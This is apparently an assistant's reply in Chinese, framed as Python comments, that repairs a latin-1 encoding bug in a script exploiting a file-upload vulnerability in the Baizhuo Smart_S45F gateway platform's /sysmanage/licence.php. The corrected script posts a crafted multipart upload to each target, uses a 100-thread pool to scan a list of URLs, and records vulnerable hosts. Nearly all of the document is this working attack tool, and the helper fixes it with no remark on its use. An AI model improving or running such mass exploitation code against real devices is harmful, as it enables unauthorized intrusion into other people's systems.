# 为了修正你的代码中的编码错误问题，首先确保你在Python文件的开头声明了UTF-8编码。其次，确保你在发送HTTP请求时将数据编码为UTF-8格式。这是确保你的请求能够正确处理包含非ASCII字符的关键。

# 在你的代码中，主要的问题出现在请求的data字段，它包含了一些无法被latin-1编码的字符，例如长破折号（—）。需要确保这个数据被正确地编码为UTF-8。

# 以下是修正后的代码：

# -*- coding: utf-8 -*-
import requests
import sys
import argparse
import json
import re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ """
    print(test)

def main():
    banner()
    parse = argparse.ArgumentParser(description="百卓Smart_S45F网关智能管理平台/sysmanage/licence.php文件上传漏洞")
    parse.add_argument('-u', '--url', dest='url', type=str, help="please input you url")
    parse.add_argument('-f', '--file', dest='file', type=str, help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt', 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/sysmanage/licence.php"
    headers = {
        'Cookie': 'PHPSESSID=b11375c64210599a5bf9a99744783d48',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Referer': 'https://localhost/sysmanage/licence.php',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Te': 'trailers',
        'Connection': 'close',
        'Content-Type': 'multipart/form-data; boundary=---------------------------42328904123665875270630079328',
    }
    data = (
        '-----------------------------42328904123665875270630079328\r\n'
        'Content-Disposition: form-data; name="ck"\r\n\r\n'
        'radhttp\r\n'
        '-----------------------------42328904123665875270630079328\r\n'
        'Content-Disposition: form-data; name="file_upload"; filename="readme.txt"\r\n'
        'Content-Type: application/octet-stream\r\n\r\n'
        '123321\r\n'
        '-----------------------------42328904123665875270630079328\r\n'
        'Content-Disposition: form-data; name="hid_tftp_ip"\r\n\r\n\r\n'
        '-----------------------------42328904123665875270630079328\r\n'
        'Content-Disposition: form-data; name="hid_ftp_ip"\r\n\r\n\r\n'
        '-----------------------------42328904123665875270630079328\r\n'
        'Content-Disposition: form-data; name="mode"\r\n\r\n'
        'set\r\n'
        '-----------------------------42328904123665875270630079328--'
    ).encode('utf-8')
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.post(url=target + payload, headers=headers, data=data, verify=False, proxies=proxies)
        if res1.status_code == 200 and 'licence.php' in res1.text:
            print(f'[+]{target}存在漏洞')
            with open('result.txt', 'a', encoding='utf-8') as fp1:
                fp1.write(target + '\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except requests.RequestException as e:
        print(f"[-] 请求失败: {target}, 错误信息: {e}")
    except json.JSONDecodeError:
        print(f"[-] 无法解码JSON响应: {target}")
    except Exception as e:
        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")

if __name__ == "__main__":
    main()
# 修正内容
# 编码声明：在文件头部添加 # -*- coding: utf-8 -*-，确保文件以UTF-8编码保存和读取。

# 数据编码：在构建数据时，使用 .encode('utf-8') 将其编码为UTF-8格式。

# 设置请求头：确保请求头的Content-Type字段中指定了边界字符串。

# 代理设置：添加了代理设置部分，这部分与你之前的代码保持一致。

# 通过上述修改，你的代码应该能够正确处理包含特殊字符的数据，并避免出现latin-1编码错误。运行这个脚本时，它将发送一个包含UTF-8编码数据的POST请求，并处理响应。